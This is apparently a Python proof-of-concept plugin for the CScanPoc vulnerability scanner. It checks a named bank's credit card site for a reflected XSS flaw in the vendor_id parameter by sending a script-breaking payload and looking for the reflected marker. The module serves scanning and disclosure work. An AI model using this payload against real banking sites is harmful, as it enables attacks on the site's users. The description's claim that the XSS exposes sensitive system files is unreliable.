# coding:utf-8
from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    vuln_id = 'Ecitic_0101' # 平台漏洞编号
    name = '中信银行信用卡中心可绕过浏览器xss过滤' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.XSS # 漏洞类型
    disclosure_date = '2016-05-23'  # 漏洞公布时间
    desc = '''
    中信银行信用卡中心可绕过浏览器xss过滤漏洞，攻击者可以通过构造恶意语句来读取系统敏感文件信息。
    ''' # 漏洞描述
    ref = 'Unknown' # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=192621
    cnvd_id = 'Unknown' # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Ecitic'  # 漏洞组件名称
    product_version = 'Unknown'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = 'd4e84ed7-309b-40f8-b7f9-acdb311748fc' # 平台 POC 编号
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-06-15' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = '/citiccard/ecitic/index.jsp?vendor_id=";alert(/Cscan-hyhmnn/)<!--'
            url = self.target + payload
            response = requests.get(url)
            if response.status_code==200 and "/Cscan-hyhmnn/" in response.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target, name=self.vuln.name))
        except Exception, e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()